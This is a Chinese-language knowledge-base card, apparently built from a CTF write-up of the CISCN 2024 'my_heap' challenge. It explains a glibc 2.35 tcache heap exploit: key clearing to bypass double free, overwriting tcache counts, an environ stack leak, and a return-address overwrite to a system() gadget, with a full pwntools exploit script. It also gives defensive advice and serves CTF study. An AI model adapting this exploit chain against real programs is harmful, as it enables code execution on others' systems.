---
id: binary-pwn-heap-glibc235-tcache-counts-key-clear-environ-rop
title: glibc 2.35 单 chunk UAF：清零 tcache key 绕过 double free + 覆写 counts 扩容，environ 泄露栈后 ROP
type: scenario
domain: binary
path: binary/pwn/heap
technique: tcache-key-clear-counts-overwrite-environ-rop
aliases:
- my_heap
- CISCN 2024 华南赛区 my_heap
- tcache counts 覆写
- tcache_perthread_struct counts 扩容
- 单 chunk UAF
- 异或加密 show 泄露
- environ 泄露栈
tags:
- pwn
- heap
- glibc-2.35
- tcache
- tcache-key
- tcache-counts
- double-free
- safe-linking
- environ
- stack-rop
- ctf
cve: []
severity: high
confidence: medium
affected_versions: glibc 2.35（原文标记 libc 2.35 / Ubuntu GLIBC 2.35-0ubuntu3.7）
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V306
  verified_at: '2026-11-08T12:03:10+08:00'
  notes: 已对照原文与 12 张图核对：add/delete/show/edit/change 源码（change 打印 sub_12BE、read 0x10）、libc 2.35-0ubuntu3.7、tcachebins environ 毒化与 counts 0x20/0x30/0x40/0x50=3、pie+0x12C6 的 lea/mov/call system@plt、getshell ls 均与截图及 exp 对应；exp 未在本机复跑。dedup 与 binary-pwn-heap-glibc235-tcache-key-clear-stack-poison-rop 为 likely_duplicate，但其理由成立：本卡独有 tcache_perthread_struct counts 覆写扩容、单 buf/8 字节 edit、异或 show、change 泄露 PIE，保留
---

## 一句话结论

在 glibc 2.35 的单 chunk UAF 菜单题里，先用 `change` 的 0x10 字节写把已释放 chunk 的 fd/key 清零，绕过 tcache 的 double-free 检测并抬高计数；再把 tcache 链毒到 `tcache_perthread_struct`、把前四个 size 的 `counts` 覆盖成 3，从而把“一次任意分配”扩成多次；随后用先前毒到 `environ` 的 0x20 bin 泄露栈地址、用 `change` 打印的函数地址泄露 PIE，最后把栈返回地址改成程序自带的 `system` 调用 gadget 拿 shell。

## 原理

- **题目限制**：全局只有一个 `buf` 指针；`add` 在 `idx != 1` 时额外 `malloc(0x4F0)` 并丢弃，`del` 只 `free(buf)` 不置空，`show` 只输出 7 字节且每字节与 `0x99+i` 异或，`edit` 只能写 8 字节，`change` 能写 0x10 字节并 `printf("magic address: %p", sub_12BE)` 泄露 PIE；main 要求 `dword_4010 == 1` 才允许进入 `change`，每用一次就自减。
- **堆基址泄露**：`add(1,0x50)` → `del` → `show`。tcache 为空时 `_int_free` 写入的 `next` 是 `PROTECT_PTR(NULL) = chunk_addr >> 12`（safe-linking）；`show` 按 `byte ^ (0x99+i)` 还原 5 字节后左移 12 位即得堆页基址 `heap_addr`，后续 safe-linking 编码都用 `目标 ^ (heap_addr>>12)`。
- **libc 泄露**：`add(1,0x440)` + `add(0,0x500)` 制造大于 tcache 上限的 chunk，`del` 后进入 unsorted bin，`show` 读回 6 字节的 `main_arena` 指针（异或解密），减去 `0x21ace0` 得 libc 基址。
- **double-free 绕过**：glibc 2.35 的 `tcache_entry` 在用户区 `+8` 存进程级 `tcache_key`，`_int_free` 发现同一 chunk 的 key 仍等于 `tcache_key` 就报 `double free detected in tcache`。`change` 从标准输入读 0x10 字节写入 `buf`（此时指向已释放 chunk 的用户区），把 fd 与 key 一起写成 0；再次 `free` 时 key 不匹配，检测被绕过，同一 chunk 可以多次进入 tcache，计数随之增大。
- **counts 扩容（本题关键）**：仅有 1 次 free 时 `counts[idx]=1`，即使把 fd 毒到任意地址，也只能分配出 1 次任意 chunk。脚本先把 tcache 链毒到 `heap_addr+0x10`（`tcache_perthread_struct` 的用户区），连续 `add(1,0x60)` 两次让第二次返回该结构；`edit(p16(0x3)*4)` 把结构开头 4 个 `uint16_t counts` 都写成 3，使 0x20/0x30/0x40/0x50 四个 bin 各有 3 次分配额度。
- **environ 泄露栈**：在扩容前已经把 0x20 bin 的 fd 毒到 `libc.sym['environ']`（`目标 ^ (heap_addr>>12)`）；counts 变成 3 后连续 `add(1,0x10)` 两次，第二次 malloc 返回 `environ` 地址，`show` 读出栈上的 `environ` 指针（6 字节异或解密），减去固定偏移得到栈地址。
- **PIE 泄露与 change 复用**：`change` 自带 `printf("magic address: %p", sub_12BE)`，解析输出即得 `pie = leak - 0x12BE`。再把 0x20 bin 毒到 `pie+0x4010`（`dword_4010`），分配后 `edit(p64(1))` 把它改回 1，重新获得一次 `change` 机会。
- **终局 ROP**：把 0x30 bin 的 fd 毒到栈地址（`目标 ^ (heap_addr>>12)`），连续 `add(1,0x30)` 两次让第二次返回栈目标；再调用一次 `change` 写入 `p64(0) + p64(pie+0x12C6)`。`pie+0x12C6` 处的代码是 `lea rax,[rip+0xd3b]; mov rdi,rax; call system@plt`，即设置命令字符串并调用 `system`；退出菜单让 main 返回即触发。

## 触发条件

- x86-64 Linux，glibc 2.32+（本题实测 2.35，tcache key 与 safe-linking 均启用）；PIE/Full RELRO/Canary 不影响。
- 程序提供“free 后仍能写 chunk 用户区”的接口（本题 `edit` 8 字节、`change` 0x10 字节都能写到已释放的 `buf`）。
- 至少有一次能把 chunk 用户区前 0x10 字节（fd + key）清零或改写的操作，用于绕过 double-free 检测。
- 有 show 接口能读回已释放 chunk 的 fd（本题异或加密但可离线还原），用于堆/libc 泄露。
- 能控制 tcache 管理结构（分配并改写 `tcache_perthread_struct`），且目标 libc 的 `environ` 偏移、`main_arena` 偏移、PIE gadget 偏移已知。
- 栈目标地址 0x10 对齐（tcache_get 的 `aligned_OK` 检查），并注意最终调用的栈对齐。

## 利用步骤

1. `add(1,0x50)` → `del` → `show`，按 `byte ^ (0x99+i)` 解出 5 字节，`heap_addr = leak << 12`。
2. `add(1,0x440)` + `add(0,0x500)` → `del` → `show`，解出 6 字节 unsorted bin 指针，`libc.address = leak - 0x21ace0`。
3. 申请/释放 0x20 chunk 后 `edit(p64(libc.sym['environ'] ^ (heap_addr>>12)))`，把 0x20 bin 的 fd 预先毒到 `environ`。
4. 用 `add/del` 准备 0x20/0x30/0x60 等 bin；调用 `change("\x00"*0x10)` 把当前释放 chunk 的 fd/key 清零，`del` 再次释放绕过 double-free；随后 `edit(p64((heap_addr+0x10) ^ (heap_addr>>12)))` 把链毒到 `tcache_perthread_struct`。
5. `add(1,0x60)` 两次，第二次返回 tcache 管理结构；`edit(p16(0x3)*4)` 把前四个 counts 写成 3。
6. `add(1,0x10)` 两次消费扩容后的 0x20 bin，第二次返回 `environ`；`show` 解出栈指针并减去偏移得栈地址。
7. 解析 `change` 打印的 `sub_12BE` 地址得 PIE；把 0x20 bin 毒到 `pie+0x4010`，分配后 `edit(p64(1))` 恢复 `dword_4010=1`。
8. 把 0x30 bin 毒到栈目标，`add(1,0x30)` 两次；`change(p64(0)+p64(pie+0x12C6))` 在栈上写入 `system` 调用 gadget，退出菜单触发返回。

## PoC

关键片段（偏移按原文环境，换 libc/题目需重算）：

```python
from pwn import *
context(arch='amd64', os='linux')

def add(idx, size):
    p.sendlineafter("edit", '1')
    p.sendlineafter("which one you choose?", str(idx))
    if idx != 0:
        p.sendlineafter("size:", str(size))

def dele():  p.sendlineafter("edit", '2')
def show():  p.sendlineafter("edit", '3')
def edit(content): p.sendlineafter("edit", '4'); p.sendafter("edit data:", content)

def backdoor(content):
    p.sendlineafter("edit", '5')
    p.recvuntil("0x")
    door = int(p.recv(12), 16)
    p.sendafter("edit data:", content)
    return door

def dec(n):                       # show 输出每字节异或 0x99+i
    v = 0
    for i in range(n):
        v += (u8(p.recv(1)) ^ (0x99 + i)) * 0x100**i
    return v

# 1) heap leak
add(1, 0x50); dele(); show(); p.recvuntil("the data"); p.recv(1)
heap_addr = dec(5) << 12

# 2) libc leak（unsorted bin）
add(1, 0x440); add(0, 0x500); dele(); show(); p.recvuntil("the data"); p.recv(1)
libc.address = dec(6) - 0x21ace0

# 3) 0x20 bin 毒到 environ
add(1, 0x3d0); dele(); add(1, 0x10); dele()
edit(p64(libc.sym['environ'] ^ (heap_addr >> 12)))

# 4) 清零 key 绕过 double free，并把链毒到 tcache_perthread_struct
add(1, 0x20); dele(); add(1, 0x30); dele(); add(1, 0x60); dele()
door = backdoor(b"\x00" * 0x10)          # 清零 fd/key
pie = door - 0x12BE
dele()                                    # 再次释放同一 chunk，绕过检测
edit(p64((heap_addr + 0x10) ^ (heap_addr >> 12)))

# 5) 覆盖 counts 前四项为 3
add(1, 0x60); add(1, 0x60)
edit(p16(0x3) * 4)

# 6) 多次分配 0x20，第二次返回 environ，泄露栈
add(1, 0x10); add(1, 0x10)
show(); p.recvuntil("the data"); p.recv(1)
stack = dec(6) - 0x80 - 8 - 0xa0

# 7) 恢复 dword_4010 以获得再一次 change
shot = pie + 0x4010
add(1, 0x20); dele(); edit(p64(shot ^ (heap_addr >> 12)))
add(1, 0x20); add(1, 0x20); edit(p64(1))

# 8) 毒到栈并写入 system 调用 gadget
add(1, 0x30); dele()
edit(p64(stack ^ (heap_addr >> 12)))
add(1, 0x30); add(1, 0x30)
backdoor(p64(0) + p64(pie + 0x12C6))      # lea rdi,[rip+0xd3b]; call system@plt
p.sendlineafter("edit", '6')              # main 返回触发
p.interactive()
```

## 变体与关联

- 变体：若不需要多次任意分配，可跳过 counts 扩容，按 `[[binary-pwn-heap-glibc235-tcache-key-clear-stack-poison-rop]]` 直接毒化栈并读 libc 指针。
- 变体：counts 也可改成更大值或按目标 bin 单独设置；注意 `tcache_get` 只检查 `counts != 0`，计数失真会带来多次分配但不会校验链长。
- 变体：`environ` 被过滤时可改毒 `libc` 中其它保存栈指针的位置，或走 FSOP（`stderr`/`_IO_list_all`）。
- 关联：`[[binary-pwn-heap-glibc243-tcache-perthread-struct-hijack]]`（改写 `entries` 实现任意分配，本卡改写 `counts` 扩容）、`[[binary-pwn-heap-uaf-tcache-poison-global-environ-stack-rop]]`（environ 泄露栈 ROP）、`[[binary-pwn-heap-safe-linking-self-xor-heap-address]]`（safe-linking 编解码）。
- 边界：exp 中 `one_gadget` 变量实际未使用，最终走 `pie+0x12C6` 的 `system` 调用 gadget；原文未在本地复跑我们的 exp，偏移依赖题目 libc 与二进制，换环境需重新计算。

## 检测与防御

- 检测（比赛/分析视角）：堆题中出现 `show` 异或编码、单指针菜单、`change` 打印函数地址等组合时，优先怀疑“单 chunk UAF + 信息泄露”链；调试时观察 `tcachebins` 的 `counts` 是否被异常抬高（如 `[3]`）。
- 防御（程序侧）：`free` 后立即置空指针；`edit/change` 前校验指针是否仍有效；限制写长度并做边界检查；`show` 不要输出已释放 chunk。
- 加固（glibc/编译）：使用带 tcache key 与 safe-linking 的现代 glibc（本题已有但仍可被 key 清零绕过）；开启 PIE/Full RELRO/Canary；对菜单 `dword_4010` 这类全局状态放在只读页或做完整性校验。
- 检测（运行侧）：监控 `tcache_perthread_struct` 区域的异常写入、`counts` 与链长不一致导致的多重分配，以及分配返回到 `libc/栈` 等非堆地址时的崩溃模式。
